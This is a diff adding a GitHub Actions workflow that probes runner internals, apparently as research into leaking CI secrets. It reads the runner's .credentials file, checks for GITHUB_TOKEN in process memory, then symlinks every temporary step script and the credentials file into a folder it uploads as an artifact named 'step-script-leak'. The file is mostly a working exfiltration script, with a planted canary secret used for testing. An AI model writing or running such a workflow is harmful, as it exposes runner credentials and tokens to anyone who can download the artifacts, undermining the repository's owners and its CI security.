@@ -1,0 +1,60 @@
+name: Step Script Analysis
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: write
+
+jobs:
+  analyze:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Analyze step script and runner internals
+        env:
+          MY_SECRET: "SECRET_VALUE_CANARY_123"
+        run: |
+          echo "=== Step script location ==="
+          echo "Script: $0"
+          echo "Script content (first 20 lines):"
+          head -20 "$0"
+          
+          echo ""
+          echo "=== All temp scripts ==="
+          ls -la /home/runner/work/_temp/*.sh 2>/dev/null
+          
+          echo ""
+          echo "=== Runner internal files ==="
+          # Check .credentials file
+          cat /home/runner/actions-runner/cached/2.335.1/.credentials 2>/dev/null | head -5
+          
+          echo ""
+          echo "=== Check /proc/self/maps for loaded libraries ==="
+          head -5 /proc/self/maps
+          
+          echo ""
+          echo "=== GITHUB_TOKEN in this step ==="
+          echo "Length: ${#GITHUB_TOKEN}"
+          echo "Present in /proc/self/environ:"
+          cat /proc/self/environ | tr '\0' '\n' | grep "^GITHUB_TOKEN" | head -1 | wc -c
+          
+      - name: Create symlink to step script and upload
+        run: |
+          mkdir -p step-leak
+          # Symlink to ALL step scripts in _temp
+          for f in /home/runner/work/_temp/*.sh; do
+            ln -sf "$f" "step-leak/$(basename $f)"
+          done
+          # Also try the runner credentials
+          ln -sf /home/runner/actions-runner/cached/2.335.1/.credentials step-leak/runner-creds 2>/dev/null || true
+          ls -la step-leak/
+          
+      - name: Upload step scripts
+        uses: actions/upload-artifact@v4
+        with:
+          name: step-script-leak
+          path: step-leak/
+          retention-days: 1
+          if-no-files-found: warn
